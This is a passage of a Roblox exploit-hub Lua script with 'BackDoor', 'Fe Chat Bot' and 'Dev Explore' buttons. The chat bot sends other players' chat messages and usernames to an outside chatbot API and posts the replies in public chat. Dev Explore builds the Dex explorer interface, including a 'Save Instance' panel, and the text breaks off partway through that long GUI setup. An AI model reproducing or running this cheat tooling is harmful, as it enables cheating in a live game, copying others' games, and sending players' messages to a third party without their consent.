	--  k4scripts
	--  .------.
	--  |4.--. |
	--  | :│/: |
	--  | :│\: |
	--  | '--'4|
	--  `------'
end)

UICorner_6.CornerRadius = UDim.new(0, 20)
UICorner_6.Parent = BackDoor

ChatBot.Name = "ChatBot"
ChatBot.Parent = HomeLol
ChatBot.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
ChatBot.BorderSizePixel = 0
ChatBot.Position = UDim2.new(0.336091042, 0, 0.19568345, 0)
ChatBot.Size = UDim2.new(0, 211, 0, 47)
ChatBot.Font = Enum.Font.Gotham
ChatBot.Text = "Fe Chat Bot"
ChatBot.TextColor3 = Color3.fromRGB(255, 255, 255)
ChatBot.TextScaled = true
ChatBot.TextSize = 14.000
ChatBot.TextWrapped = true
ChatBot.MouseButton1Click:Connect(function()
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")

	_G.Owner = "HellasHellSomeTimesW"

	function getChat(message,plrname)

		local Split = message:gsub(" ", "+") -- This takes spaces within the person's message and turns it into for ex: Hi+How+Are+You... to ensure that there are no errors and to also make the URL work

		local Response = game:HttpGet("https://api.affiliateplus.xyz/api/chatbot?message=" .. Split .. "&botname=" .. plrname .. "&ownername=" .. _G.Owner .. "&user=1")
		local Data = HttpService:JSONDecode(Response)
		wait(1)
		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Data.message, "All")
	end

	Players.PlayerChatted:Connect(function(type, plr, message)
		if plr.Name ~= Players.LocalPlayer.Name then
			getChat(message, plr.Name)
		end
	end)
end)

UICorner_7.CornerRadius = UDim.new(0, 20)
UICorner_7.Parent = ChatBot

DevExplore.Name = "DevExplore"
DevExplore.Parent = HomeLol
DevExplore.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
DevExplore.BorderSizePixel = 0
DevExplore.Position = UDim2.new(0.336091042, 0, 0.376978397, 0)
DevExplore.Size = UDim2.new(0, 211, 0, 47)
DevExplore.Font = Enum.Font.Gotham
DevExplore.Text = "Dev Explore"
DevExplore.TextColor3 = Color3.fromRGB(255, 255, 255)
DevExplore.TextScaled = true
DevExplore.TextSize = 14.000
DevExplore.TextWrapped = true
DevExplore.MouseButton1Click:Connect(function()
	CreateGui = function()
		local NewGuiPart1 = Instance.new("ScreenGui")
		local NewGuiPart2 = Instance.new("Frame")
		local NewGuiPart3 = Instance.new("Frame")
		local NewGuiPart4 = Instance.new("TextLabel")
		local NewGuiPart5 = Instance.new("TextBox")
		local NewGuiPart6 = Instance.new("Frame")
		local NewGuiPart7 = Instance.new("Frame")
		local NewGuiPart8 = Instance.new("TextButton")
		local NewGuiPart9 = Instance.new("TextLabel")
		local NewGuiPart10 = Instance.new("TextLabel")
		local NewGuiPart11 = Instance.new("ImageLabel")
		local NewGuiPart12 = Instance.new("Frame")
		local NewGuiPart13 = Instance.new("Frame")
		local NewGuiPart14 = Instance.new("Frame")
		local NewGuiPart15 = Instance.new("TextButton")
		local NewGuiPart16 = Instance.new("ImageLabel")
		local NewGuiPart17 = Instance.new("TextButton")
		local NewGuiPart18 = Instance.new("ImageLabel")
		local NewGuiPart19 = Instance.new("TextButton")
		local NewGuiPart20 = Instance.new("ImageLabel")
		local NewGuiPart21 = Instance.new("TextButton")
		local NewGuiPart22 = Instance.new("ImageLabel")
		local NewGuiPart23 = Instance.new("TextButton")
		local NewGuiPart24 = Instance.new("ImageLabel")
		local NewGuiPart25 = Instance.new("TextButton")
		local NewGuiPart26 = Instance.new("ImageLabel")
		local NewGuiPart27 = Instance.new("TextButton")
		local NewGuiPart28 = Instance.new("Frame")
		local NewGuiPart29 = Instance.new("Frame")
		local NewGuiPart30 = Instance.new("TextLabel")
		local NewGuiPart31 = Instance.new("Frame")
		local NewGuiPart32 = Instance.new("TextLabel")
		local NewGuiPart33 = Instance.new("TextLabel")
		local NewGuiPart34 = Instance.new("TextButton")
		local NewGuiPart35 = Instance.new("TextLabel")
		local NewGuiPart36 = Instance.new("TextLabel")
		local NewGuiPart37 = Instance.new("Frame")
		local NewGuiPart38 = Instance.new("Frame")
		local NewGuiPart39 = Instance.new("TextLabel")
		local NewGuiPart40 = Instance.new("Frame")
		local NewGuiPart41 = Instance.new("TextButton")
		local NewGuiPart42 = Instance.new("TextLabel")
		local NewGuiPart43 = Instance.new("TextButton")
		local NewGuiPart44 = Instance.new("TextBox")
		local NewGuiPart45 = Instance.new("TextButton")
		local NewGuiPart46 = Instance.new("TextLabel")
		local NewGuiPart47 = Instance.new("TextLabel")
		local NewGuiPart48 = Instance.new("Frame")
		local NewGuiPart49 = Instance.new("TextLabel")
		local NewGuiPart50 = Instance.new("Frame")
		local NewGuiPart51 = Instance.new("TextButton")
		local NewGuiPart52 = Instance.new("TextLabel")
		local NewGuiPart53 = Instance.new("TextButton")
		local NewGuiPart54 = Instance.new("Frame")
		local NewGuiPart55 = Instance.new("TextLabel")
		local NewGuiPart56 = Instance.new("Frame")
		local NewGuiPart57 = Instance.new("TextLabel")
		local NewGuiPart58 = Instance.new("TextButton")
		local NewGuiPart59 = Instance.new("Frame")
		local NewGuiPart60 = Instance.new("TextLabel")
		local NewGuiPart61 = Instance.new("Frame")
		local NewGuiPart62 = Instance.new("TextLabel")
		local NewGuiPart63 = Instance.new("ScrollingFrame")
		local NewGuiPart64 = Instance.new("TextButton")
		local NewGuiPart65 = Instance.new("TextLabel")
		local NewGuiPart66 = Instance.new("TextLabel")
		local NewGuiPart67 = Instance.new("TextButton")
		local NewGuiPart68 = Instance.new("TextButton")
		local NewGuiPart69 = Instance.new("Frame")
		local NewGuiPart70 = Instance.new("TextButton")
		local NewGuiPart71 = Instance.new("TextBox")
		local NewGuiPart72 = Instance.new("TextButton")
		local NewGuiPart73 = Instance.new("TextButton")
		local NewGuiPart74 = Instance.new("Frame")
		local NewGuiPart75 = Instance.new("Frame")
		local NewGuiPart76 = Instance.new("TextButton")
		local NewGuiPart77 = Instance.new("ScrollingFrame")
		local NewGuiPart78 = Instance.new("Frame")
		local NewGuiPart79 = Instance.new("TextLabel")
		local NewGuiPart80 = Instance.new("TextLabel")
		local NewGuiPart81 = Instance.new("TextLabel")
		local NewGuiPart82 = Instance.new("Frame")
		local NewGuiPart83 = Instance.new("TextLabel")
		local NewGuiPart84 = Instance.new("Frame")
		local NewGuiPart85 = Instance.new("Frame")
		local NewGuiPart86 = Instance.new("Frame")
		local NewGuiPart87 = Instance.new("ImageButton")
		local NewGuiPart88 = Instance.new("Frame")
		local NewGuiPart89 = Instance.new("Frame")
		local NewGuiPart90 = Instance.new("Frame")
		local NewGuiPart91 = Instance.new("Frame")
		local NewGuiPart92 = Instance.new("Frame")
		local NewGuiPart93 = Instance.new("ImageButton")
		local NewGuiPart94 = Instance.new("Frame")
		local NewGuiPart95 = Instance.new("Frame")
		local NewGuiPart96 = Instance.new("Frame")
		local NewGuiPart97 = Instance.new("Frame")
		local NewGuiPart98 = Instance.new("Frame")
		local NewGuiPart99 = Instance.new("TextButton")
		local NewGuiPart100 = Instance.new("Frame")
		local NewGuiPart101 = Instance.new("Frame")
		local NewGuiPart102 = Instance.new("TextButton")
		local NewGuiPart103 = Instance.new("TextButton")
		local NewGuiPart104 = Instance.new("TextButton")
		local NewGuiPart105 = Instance.new("Frame")
		local NewGuiPart106 = Instance.new("Frame")
		local NewGuiPart107 = Instance.new("TextLabel")
		local NewGuiPart108 = Instance.new("TextLabel")
		local NewGuiPart109 = Instance.new("TextLabel")
		local NewGuiPart110 = Instance.new("ImageLabel")
		local NewGuiPart111 = Instance.new("Frame")
		local NewGuiPart112 = Instance.new("Frame")
		local NewGuiPart113 = Instance.new("TextLabel")
		local NewGuiPart114 = Instance.new("Frame")
		local NewGuiPart115 = Instance.new("Frame")
		local NewGuiPart116 = Instance.new("TextLabel")
		local NewGuiPart117 = Instance.new("TextLabel")
		local NewGuiPart118 = Instance.new("TextButton")
		local NewGuiPart119 = Instance.new("TextLabel")
		local NewGuiPart120 = Instance.new("TextLabel")
		local NewGuiPart121 = Instance.new("Frame")
		local NewGuiPart122 = Instance.new("TextLabel")
		local NewGuiPart123 = Instance.new("TextLabel")
		local NewGuiPart124 = Instance.new("TextButton")
		local NewGuiPart125 = Instance.new("TextLabel")
		local NewGuiPart126 = Instance.new("TextLabel")
		local NewGuiPart127 = Instance.new("Frame")
		local NewGuiPart128 = Instance.new("TextLabel")
		local NewGuiPart129 = Instance.new("TextLabel")
		local NewGuiPart130 = Instance.new("TextButton")
		local NewGuiPart131 = Instance.new("TextLabel")
		local NewGuiPart132 = Instance.new("TextLabel")
		local NewGuiPart133 = Instance.new("Frame")
		local NewGuiPart134 = Instance.new("TextLabel")
		local NewGuiPart135 = Instance.new("TextLabel")
		local NewGuiPart136 = Instance.new("TextButton")
		local NewGuiPart137 = Instance.new("TextLabel")
		local NewGuiPart138 = Instance.new("TextLabel")
		local NewGuiPart139 = Instance.new("TextLabel")
		local NewGuiPart140 = Instance.new("Frame")
		local NewGuiPart141 = Instance.new("Frame")
		local NewGuiPart142 = Instance.new("TextLabel")
		local NewGuiPart143 = Instance.new("TextButton")
		local NewGuiPart144 = Instance.new("TextBox")
		local NewGuiPart145 = Instance.new("Frame")
		local NewGuiPart146 = Instance.new("TextButton")
		local NewGuiPart147 = Instance.new("TextLabel")
		local NewGuiPart148 = Instance.new("TextLabel")
		local NewGuiPart149 = Instance.new("Frame")
		local NewGuiPart150 = Instance.new("Frame")
		local NewGuiPart151 = Instance.new("TextLabel")
		local NewGuiPart152 = Instance.new("TextLabel")
		local NewGuiPart153 = Instance.new("BindableFunction")
		local NewGuiPart154 = Instance.new("BindableFunction")
		local NewGuiPart155 = Instance.new("BindableFunction")
		local NewGuiPart156 = Instance.new("BindableFunction")
		local NewGuiPart157 = Instance.new("BindableEvent")
		local NewGuiPart158 = Instance.new("BindableFunction")
		local NewGuiPart159 = Instance.new("BindableFunction")
		local NewGuiPart160 = Instance.new("BindableEvent")
		local NewGuiPart161 = Instance.new("BindableFunction")
		local NewGuiPart162 = Instance.new("BindableFunction")
		local NewGuiPart163 = Instance.new("BindableEvent")
		-- Properties

		NewGuiPart1.Name = "Dex"

		NewGuiPart2.Name = "PropertiesFrame"
		NewGuiPart2.Parent = NewGuiPart1
		NewGuiPart2.Active = true
		NewGuiPart2.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart2.BackgroundTransparency = 0.10000000149012
		NewGuiPart2.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart2.Position = UDim2.new(1, 0, 0.5, 36)
		NewGuiPart2.Size = UDim2.new(0, 300, 0.5, -36)

		NewGuiPart158.Name = "GetApi"
		NewGuiPart158.Parent = NewGuiPart2
		NewGuiPart158.Archivable = true

		NewGuiPart159.Name = "GetAwaiting"
		NewGuiPart159.Parent = NewGuiPart2
		NewGuiPart159.Archivable = true

		NewGuiPart160.Name = "SetAwaiting"
		NewGuiPart160.Parent = NewGuiPart2
		NewGuiPart160.Archivable = true

		NewGuiPart3.Name = "Header"
		NewGuiPart3.Parent = NewGuiPart2
		NewGuiPart3.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart3.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart3.Position = UDim2.new(0, 0, 0, -36)
		NewGuiPart3.Size = UDim2.new(1, 0, 0, 35)

		NewGuiPart4.Parent = NewGuiPart3
		NewGuiPart4.BackgroundTransparency = 1
		NewGuiPart4.Position = UDim2.new(0, 4, 0, 0)
		NewGuiPart4.Size = UDim2.new(1, -4, 0.5, 0)
		NewGuiPart4.Font = Enum.Font.SourceSans
		NewGuiPart4.FontSize = Enum.FontSize.Size14
		NewGuiPart4.Text = "Properties"
		NewGuiPart4.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart4.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart5.Parent = NewGuiPart3
		NewGuiPart5.BackgroundTransparency = 0.80000001192093
		NewGuiPart5.Position = UDim2.new(0, 4, 0.5, 0)
		NewGuiPart5.Size = UDim2.new(1, -8, 0.5, -3)
		NewGuiPart5.Font = Enum.Font.SourceSans
		NewGuiPart5.FontSize = Enum.FontSize.Size14
		NewGuiPart5.Text = "Search Properties"
		--NewGuiPart5.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart5.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart6.Name = "ExplorerPanel"
		NewGuiPart6.Parent = NewGuiPart1
		NewGuiPart6.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart6.BackgroundTransparency = 0.10000000149012
		NewGuiPart6.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart6.Position = UDim2.new(1, 0, 0, 0)
		NewGuiPart6.Size = UDim2.new(0, 300, 0.5, 0)

		NewGuiPart153.Name = "GetOption"
		NewGuiPart153.Parent = NewGuiPart6
		NewGuiPart153.Archivable = true

		NewGuiPart154.Name = "TotallyNotGetSelection"
		NewGuiPart154.Parent = NewGuiPart6
		NewGuiPart154.Archivable = true

		NewGuiPart155.Name = "SetOption"
		NewGuiPart155.Parent = NewGuiPart6
		NewGuiPart155.Archivable = true

		NewGuiPart156.Name = "TotallyNotSetSelection"
		NewGuiPart156.Parent = NewGuiPart6
		NewGuiPart156.Archivable = true

		NewGuiPart157.Name = "TotallyNotSelectionChanged"
		NewGuiPart157.Parent = NewGuiPart6
		NewGuiPart157.Archivable = true

		NewGuiPart7.Name = "SideMenu"
		NewGuiPart7.Parent = NewGuiPart1
		NewGuiPart7.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart7.BackgroundTransparency = 1
		NewGuiPart7.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart7.BorderSizePixel = 0
		NewGuiPart7.Position = UDim2.new(1, -330, 0, 0)
		NewGuiPart7.Size = UDim2.new(0, 30, 0, 180)
		NewGuiPart7.Visible = false
		NewGuiPart7.ZIndex = 2

		NewGuiPart8.Name = "Toggle"
		NewGuiPart8.Parent = NewGuiPart7
		NewGuiPart8.Active = false
		NewGuiPart8.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart8.BorderSizePixel = 0
		NewGuiPart8.Position = UDim2.new(0, 0, 0, 60)
		NewGuiPart8.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart8.AutoButtonColor = false
		NewGuiPart8.Font = Enum.Font.SourceSans
		NewGuiPart8.FontSize = Enum.FontSize.Size24
		NewGuiPart8.Text = ">"
		NewGuiPart8.TextTransparency = 1
		NewGuiPart8.TextWrapped = true

		NewGuiPart9.Name = "Title"
		NewGuiPart9.Parent = NewGuiPart7
		NewGuiPart9.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart9.BackgroundTransparency = 1
		NewGuiPart9.Size = UDim2.new(0, 30, 0, 20)
		NewGuiPart9.ZIndex = 2
		NewGuiPart9.Font = Enum.Font.SourceSansBold
		NewGuiPart9.FontSize = Enum.FontSize.Size14
		NewGuiPart9.Text = "DEX"
		NewGuiPart9.TextWrapped = true

		NewGuiPart10.Name = "Version"
		NewGuiPart10.Parent = NewGuiPart7
		NewGuiPart10.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart10.BackgroundTransparency = 1
		NewGuiPart10.Position = UDim2.new(0, 0, 0, 15)
		NewGuiPart10.Size = UDim2.new(0, 30, 0, 20)
		NewGuiPart10.ZIndex = 2
		NewGuiPart10.Font = Enum.Font.SourceSansBold
		NewGuiPart10.FontSize = Enum.FontSize.Size12
		NewGuiPart10.Text = "V2.0.0"
		NewGuiPart10.TextWrapped = true

		NewGuiPart11.Name = "Slant"
		NewGuiPart11.Parent = NewGuiPart7
		NewGuiPart11.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart11.BackgroundTransparency = 1
		NewGuiPart11.Position = UDim2.new(0, 0, 0, 90)
		NewGuiPart11.Rotation = 180
		NewGuiPart11.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart11.Image = "rbxassetid://474172996"
		NewGuiPart11.ImageColor3 = Color3.new(0.913726, 0.913726, 0.913726)

		NewGuiPart12.Name = "Main"
		NewGuiPart12.Parent = NewGuiPart7
		NewGuiPart12.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart12.BorderSizePixel = 0
		NewGuiPart12.Size = UDim2.new(0, 30, 0, 30)

		NewGuiPart13.Name = "SlideOut"
		NewGuiPart13.Parent = NewGuiPart7
		NewGuiPart13.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart13.BackgroundTransparency = 1
		NewGuiPart13.BorderSizePixel = 0
		NewGuiPart13.ClipsDescendants = true
		NewGuiPart13.Position = UDim2.new(0, 0, 0, 30)
		NewGuiPart13.Size = UDim2.new(0, 30, 0, 150)

		NewGuiPart14.Name = "SlideFrame"
		NewGuiPart14.Parent = NewGuiPart13
		NewGuiPart14.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart14.BorderSizePixel = 0
		NewGuiPart14.Position = UDim2.new(0, 0, 0, -150)
		NewGuiPart14.Size = UDim2.new(0, 30, 0, 150)

		NewGuiPart15.Name = "Explorer"
		NewGuiPart15.Parent = NewGuiPart14
		NewGuiPart15.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart15.BackgroundTransparency = 1
		NewGuiPart15.BorderSizePixel = 0
		NewGuiPart15.Position = UDim2.new(0, 0, 0, 120)
		NewGuiPart15.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart15.ZIndex = 2
		NewGuiPart15.AutoButtonColor = false
		NewGuiPart15.Font = Enum.Font.SourceSans
		NewGuiPart15.FontSize = Enum.FontSize.Size24
		NewGuiPart15.Text = ""

		NewGuiPart16.Name = "Icon"
		NewGuiPart16.Parent = NewGuiPart15
		NewGuiPart16.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart16.BackgroundTransparency = 1
		NewGuiPart16.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart16.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart16.ZIndex = 2
		NewGuiPart16.Image = "rbxassetid://472635937"
		NewGuiPart16.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

		NewGuiPart17.Name = "SaveMap"
		NewGuiPart17.Parent = NewGuiPart14
		NewGuiPart17.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart17.BackgroundTransparency = 1
		NewGuiPart17.BorderSizePixel = 0
		NewGuiPart17.Position = UDim2.new(0, 0, 0, 90)
		NewGuiPart17.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart17.ZIndex = 2
		NewGuiPart17.AutoButtonColor = false
		NewGuiPart17.Font = Enum.Font.SourceSans
		NewGuiPart17.FontSize = Enum.FontSize.Size24
		NewGuiPart17.Text = ""

		NewGuiPart18.Name = "Icon"
		NewGuiPart18.Parent = NewGuiPart17
		NewGuiPart18.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart18.BackgroundTransparency = 1
		NewGuiPart18.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart18.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart18.ZIndex = 2
		NewGuiPart18.Image = "rbxassetid://472636337"
		NewGuiPart18.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

		NewGuiPart19.Name = "Settings"
		NewGuiPart19.Parent = NewGuiPart14
		NewGuiPart19.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart19.BackgroundTransparency = 1
		NewGuiPart19.BorderSizePixel = 0
		NewGuiPart19.Position = UDim2.new(0, 0, 0, 30)
		NewGuiPart19.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart19.ZIndex = 2
		NewGuiPart19.AutoButtonColor = false
		NewGuiPart19.Font = Enum.Font.SourceSans
		NewGuiPart19.FontSize = Enum.FontSize.Size24
		NewGuiPart19.Text = ""

		NewGuiPart20.Name = "Icon"
		NewGuiPart20.Parent = NewGuiPart19
		NewGuiPart20.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart20.BackgroundTransparency = 1
		NewGuiPart20.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart20.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart20.ZIndex = 2
		NewGuiPart20.Image = "rbxassetid://472635774"
		NewGuiPart20.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

		NewGuiPart21.Name = "Remotes"
		NewGuiPart21.Parent = NewGuiPart14
		NewGuiPart21.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart21.BackgroundTransparency = 1
		NewGuiPart21.BorderSizePixel = 0
		NewGuiPart21.Position = UDim2.new(0, 0, 0, 60)
		NewGuiPart21.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart21.ZIndex = 2
		NewGuiPart21.AutoButtonColor = false
		NewGuiPart21.Font = Enum.Font.SourceSans
		NewGuiPart21.FontSize = Enum.FontSize.Size24
		NewGuiPart21.Text = ""

		NewGuiPart22.Name = "Icon"
		NewGuiPart22.Parent = NewGuiPart21
		NewGuiPart22.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart22.BackgroundTransparency = 1
		NewGuiPart22.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart22.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart22.ZIndex = 2
		NewGuiPart22.Image = "rbxassetid://472636187"
		NewGuiPart22.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

		NewGuiPart23.Name = "About"
		NewGuiPart23.Parent = NewGuiPart14
		NewGuiPart23.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart23.BackgroundTransparency = 1
		NewGuiPart23.BorderSizePixel = 0
		NewGuiPart23.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart23.ZIndex = 2
		NewGuiPart23.AutoButtonColor = false
		NewGuiPart23.Font = Enum.Font.SourceSans
		NewGuiPart23.FontSize = Enum.FontSize.Size24
		NewGuiPart23.Text = ""

		NewGuiPart24.Name = "Icon"
		NewGuiPart24.Parent = NewGuiPart23
		NewGuiPart24.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart24.BackgroundTransparency = 1
		NewGuiPart24.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart24.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart24.ZIndex = 2
		NewGuiPart24.Image = "rbxassetid://476354004"
		NewGuiPart24.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

		NewGuiPart25.Name = "OpenScriptEditor"
		NewGuiPart25.Parent = NewGuiPart7
		NewGuiPart25.Active = false
		NewGuiPart25.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart25.BorderSizePixel = 0
		NewGuiPart25.Position = UDim2.new(0, 0, 0, 30)
		NewGuiPart25.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart25.ZIndex = 2
		NewGuiPart25.AutoButtonColor = false
		NewGuiPart25.Font = Enum.Font.SourceSans
		NewGuiPart25.FontSize = Enum.FontSize.Size24
		NewGuiPart25.Text = ""

		NewGuiPart26.Name = "Icon"
		NewGuiPart26.Parent = NewGuiPart25
		NewGuiPart26.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart26.BackgroundTransparency = 1
		NewGuiPart26.Position = UDim2.new(0, 5, 0, 5)
		NewGuiPart26.Size = UDim2.new(0, 20, 0, 20)
		NewGuiPart26.ZIndex = 2
		NewGuiPart26.Image = "rbxassetid://475456048"
		NewGuiPart26.ImageColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		NewGuiPart26.ImageTransparency = 1

		NewGuiPart27.Name = "Toggle"
		NewGuiPart27.Parent = NewGuiPart1
		NewGuiPart27.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart27.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart27.Position = UDim2.new(1, 0, 0, 0)
		NewGuiPart27.Size = UDim2.new(0, 30, 0, 30)
		NewGuiPart27.Font = Enum.Font.SourceSans
		NewGuiPart27.FontSize = Enum.FontSize.Size24
		NewGuiPart27.Text = "<"

		NewGuiPart28.Name = "SettingsPanel"
		NewGuiPart28.Parent = NewGuiPart1
		NewGuiPart28.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart28.BackgroundTransparency = 0.10000000149012
		NewGuiPart28.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
		NewGuiPart28.Position = UDim2.new(1, 0, 0, 0)
		NewGuiPart28.Size = UDim2.new(0, 300, 1, 0)

		NewGuiPart162.Name = "GetSetting"
		NewGuiPart162.Parent = NewGuiPart28
		NewGuiPart162.Archivable = true

		NewGuiPart29.Name = "Header"
		NewGuiPart29.Parent = NewGuiPart28
		NewGuiPart29.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart29.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart29.Size = UDim2.new(1, 0, 0, 17)

		NewGuiPart30.Parent = NewGuiPart29
		NewGuiPart30.BackgroundTransparency = 1
		NewGuiPart30.Position = UDim2.new(0, 4, 0, 0)
		NewGuiPart30.Size = UDim2.new(1, -4, 1, 0)
		NewGuiPart30.Font = Enum.Font.SourceSans
		NewGuiPart30.FontSize = Enum.FontSize.Size14
		NewGuiPart30.Text = "Settings"
		NewGuiPart30.TextColor3 = Color3.new(0, 0, 0)
		NewGuiPart30.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart31.Name = "SettingTemplate"
		NewGuiPart31.Parent = NewGuiPart28
		NewGuiPart31.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart31.BackgroundTransparency = 1
		NewGuiPart31.Position = UDim2.new(0, 0, 0, 18)
		NewGuiPart31.Size = UDim2.new(1, 0, 0, 60)
		NewGuiPart31.Visible = false

		NewGuiPart32.Name = "SName"
		NewGuiPart32.Parent = NewGuiPart31
		NewGuiPart32.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart32.BackgroundTransparency = 1
		NewGuiPart32.Position = UDim2.new(0, 10, 0, 0)
		NewGuiPart32.Size = UDim2.new(1, -20, 0, 30)
		NewGuiPart32.Font = Enum.Font.SourceSans
		NewGuiPart32.FontSize = Enum.FontSize.Size18
		NewGuiPart32.Text = "SettingName"
		NewGuiPart32.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart33.Name = "Status"
		NewGuiPart33.Parent = NewGuiPart31
		NewGuiPart33.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart33.BackgroundTransparency = 1
		NewGuiPart33.Position = UDim2.new(0, 60, 0, 30)
		NewGuiPart33.Size = UDim2.new(0, 50, 0, 15)
		NewGuiPart33.Font = Enum.Font.SourceSans
		NewGuiPart33.FontSize = Enum.FontSize.Size18
		NewGuiPart33.Text = "Off"
		NewGuiPart33.TextXAlignment = Enum.TextXAlignment.Left

		NewGuiPart34.Name = "Change"
		NewGuiPart34.Parent = NewGuiPart31
		NewGuiPart34.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
		NewGuiPart34.BorderSizePixel = 0
		NewGuiPart34.Position = UDim2.new(0, 10, 0, 30)
		NewGuiPart34.Size = UDim2.new(0, 40, 0, 15)
		NewGuiPart34.Font = Enum.Font.SourceSans
		NewGuiPart34.FontSize = Enum.FontSize.Size14
		NewGuiPart34.Text = ""

		NewGuiPart35.Name = "OnBar"
		NewGuiPart35.Parent = NewGuiPart34
		NewGuiPart35.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
		NewGuiPart35.BorderSizePixel = 0
		NewGuiPart35.Size = UDim2.new(0, 0, 0, 15)
		NewGuiPart35.Font = Enum.Font.SourceSans
		NewGuiPart35.FontSize = Enum.FontSize.Size14
		NewGuiPart35.Text = ""

		NewGuiPart36.Name = "Bar"
		NewGuiPart36.Parent = NewGuiPart34
		NewGuiPart36.BackgroundColor3 = Color3.new(0, 0, 0)
		NewGuiPart36.BorderSizePixel = 0
		NewGuiPart36.ClipsDescendants = true
		NewGuiPart36.Position = UDim2.new(0, -2, 0, -2)
		NewGuiPart36.Size = UDim2.new(0, 10, 0, 19)
		NewGuiPart36.Font = Enum.Font.SourceSans
		NewGuiPart36.FontSize = Enum.FontSize.Size14
		NewGuiPart36.Text = ""

		NewGuiPart37.Name = "SettingList"
		NewGuiPart37.Parent = NewGuiPart28
		NewGuiPart37.BackgroundColor3 = Color3.new(1, 1, 1)
		NewGuiPart37.BackgroundTransparency = 1
		NewGuiPart37.Position = UDim2.new(0, 0, 0, 17)
		NewGuiPart37.Size = UDim2.new(1, 0, 1, -17)

		NewGuiPart38.Name = "SaveInstance"
		NewGuiPart38.Parent = NewGuiPart1
		NewGuiPart38.Active = true
		NewGuiPart38.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
		NewGuiPart38.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
		NewGuiPart38.Draggable = true
		NewGuiPart38.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
		NewGuiPart38.Size = UDim2.new(0, 350, 0, 20)
		NewGuiPart38.Visible = false
		NewGuiPart38.ZIndex = 2

		NewGuiPart39.Name = "Title"
		NewGuiPart39.Parent = NewGuiPart38
		NewGuiPart39.BackgroundTransparency = 1
		NewGuiPart39.Size = UDim2.new(1, 0, 1, 0)
		NewGuiPart39.ZIndex = 2
		NewGuiPart39.Font = Enum.Font.SourceSans
		NewGuiPart39.FontSize = Enum.FontSize.Size14
		NewGuiPart39.Text = "Save Instance"
		NewGuiPart39.TextColor3 = Color3.new(0, 0, 0)
